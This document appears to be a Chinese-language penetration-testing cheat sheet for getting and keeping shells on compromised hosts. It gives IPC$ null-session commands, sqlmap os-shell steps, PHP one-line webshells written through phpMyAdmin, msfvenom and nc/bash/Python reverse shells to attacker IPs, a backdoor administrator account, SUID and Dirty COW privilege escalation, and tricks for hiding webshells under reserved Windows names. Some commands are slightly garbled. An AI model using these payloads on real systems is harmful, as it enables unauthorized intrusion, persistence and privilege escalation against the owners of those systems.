NTLM 远程验证

sid

ipc$  空连接

​	net use \\\10.96.10.5(ip)\ipc$ "" /user:"" 建立ipc$空连接

​	net use \\\10.96.10.59(ip)\ipc$ "密码" \user:"用户名"

​	net use z:\\\10.96.10.59\c$  如果建立的空连接的且有权限的话，把目标主机的C盘映射到本地的Z盘

ips ids 入侵检测

拿shell

​	sqlmap拿shell（--sql-shell获取数据库的密码）						

​				php+mysql实例<https://www.cnblogs.com/ichunqiu/archive/2018/05/31/9117308.html>

​	–file-read #读取指定文件

​	–file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)

		–sql-shell #执行指定sql命令

​	 –sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ )

​		1通过注入点发布的网站具有上传功能

​			1.sqlmap.py -u “域名” –-os-shell

​			2.选择网站的语言

​			3.网站发布的绝对路径（1网站是通常在的路径，2指定物理路径，4是强力搜索的路径）

​			4成功后会发布一个网站能够上传木马，什么类型的网站上传什么类型的木马然后在访问木马执行木马

​              	 详细步骤<https://cloud.tencent.com/developer/news/305392>

​		2直接连接数据库

​			1sqlmap.py -d “mysql://root:123456@127.0.0.1:3306/mysql”–os-shell

​			2bash -i >& /dev/tcp/192.168.1.3/80800>&1（选择是64位操作系统还是32位）反弹到服务器192.168.1.3

​			3echo “?php@eval($_POST['chopper']);?” >/data/www/phpmyadmin/1.php   使用菜刀来连接

​	通过msf反弹

​			1.msfvenom -p  php/meterpreter/reverse_tcpLHOST=192.168.1.3 -f raw > test.php

​			2.攻击者监听端口显示回弹的shell 

​			   msfconsole

​			   use exploit/multi/handler

​			   set payload php/meterpreter/reverse_tcp

​			   set LHOST 192.168.1.3  //192.168.1.3为反弹监听服务器IP

​			   show options

​			   exploit

​			3.将test.php上传到192.168.1.2服务器上面，访问后即可获取msf反弹shell

​				http:// 192.168.1.2:8080/test.php

​	通过phpmyadmin生成一句话

​			1先登录到后台

​			2select ‘<?php @eval($_POST[cmd]);?>’INTOOUTFILE ‘/data/www/phpmyadmin/eval.php’

​	nc反弹

·			1.在攻击端创建监听端口  nc -l -p 4444 

​			 2.在被攻击端执行反弹shell nc -e /bin/bash 192.168.1.2 4444

​	使用put方法

​			1.在网页目录的位置上写上传文件的名字，在数据部分写一句话木马，或大码

​			2.直接使用菜刀连接，大码的话直接访问页面

​			

​			1 put /1.txt

​			2 COPY /web100/6/1.txt HTTP/1.1

			      Destination:  http://10.6.21.98/web100/6/1.asp;.txt

​			   Overwrite: T

​	bash	

​			bash -i >& /dev/tcp/192.168.1.2/4444 0>&1

​	phpmyadmin 

​				SHOWVARIABLES LIKE”general%”  日志写入一句话

​			   setglobal general_log = “ON”；  开启日志

​	                   SET globalgeneral_log_file=’C:/phpStudy/PHPTutorial/WWW/1.php’  日志的保存位置和日志的名称

​			   select’<?php eval($_POST[hack]);?>’;    上传一句话

​			  setglobal general_log = “OFF”；关闭日志

​			  上传wce工具进行密码抓取  

​			

拿到shell后

​	先使用 whoami 查看自己的用户发现自己的权限

​	磁盘映射 

​			net use X: \\\172.17.0.1\D$\test password /USER:Administrator

​	net user

​			高权限：

​					1.如果权限是高权限的话直接使用net user ssx ssx /add

​											     net localgroup administrators ssx /add

​			低权限：

​					1.查看文件内容找到连接数据库的文件 

​							1.1找到连接数据库的文件  发现账号密码 使用sa权限的数据库 执行dos命令

​					2.能执行cmd命令的上传自已的木马程序 使用cmd命令执行

​					3centos内核版本信息>2.6.22可以使用脏牛提权

​					4suid提权

​							4.find / -perm -u=s -type f 2>/dev/null

​								find：

​									/usr/bin/find -exec whoami(命令) \;

​					                 4.2python环境提权（python进去了是root权限  反弹root权限的shell）

					/usr/bin/find -exec python -c  'import       socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'                         详情https://blog.csdn.net/qq_36119192/article/details/84872644
 							在攻击端 nc -lvp 4444 接收 为root权限

​				    5.使用宝塔windows面板提权

隐藏shell

​		                              1.       windows不能以               aux|prn|con|nul|com1|com2|com3|com4|com5|com6|

​                                                        com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9的名字保存文件 

​							使用                       copy   D:\shell.asp   \\\\.\D:\aux.shell.asp     能够命名文件

​                                              2         利用clsid隐藏

​								md \\.\d:\com1.{20D04FE0-3AEA-1069-A2D8-08002B30309D}

